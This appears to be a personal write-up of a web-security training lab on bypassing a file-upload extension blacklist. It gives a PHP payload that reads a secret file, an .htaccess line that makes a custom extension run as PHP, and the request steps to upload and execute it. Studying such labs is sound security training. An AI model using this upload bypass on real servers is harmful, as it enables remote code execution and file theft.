Certain file extensions are blacklisted, but this defense can be bypassed due to a fundamental flaw in the configuration of this blacklist.

To solve the lab, upload a basic PHP web shell, then use it to exfiltrate the contents of the file /home/carlos/secret. Submit this secret using the button provided in the lab banner. 

so in this lab we are going to change what files are accepted in the `.htaccess` so first ew modify the request to 

![[Pasted image 20250327155957.png]]

this allows the .evil extension to be accepted 

next we send this with the .evil
![[Pasted image 20250327155934.png]]

this then allows us to access the data 
## Bypassing blacklisted 
### Capture Avatar Request
- Log in, upload an avatar, and capture the GET request from `/files/avatars/<YOUR-IMAGE>`.

### Create PHP Exploit
- Create `exploit.php` with:
  ```php
  <?php echo file_get_contents('/home/carlos/secret'); ?>
  ```
- Note: Direct .php uploads are blocked.

### Bypass Using .htaccess
- Modify the POST `/my-account/avatar` request:
  - Upload a `.htaccess` file with:
    ```apache
    AddType application/x-httpd-php .l33t
    ```

### Upload and Execute Exploit
- Change the filename to `exploit.l33t` in the POST request and upload.
- Modify the GET request path to `/files/avatars/exploit.l33t` to execute the file and reveal Carlos's secret.
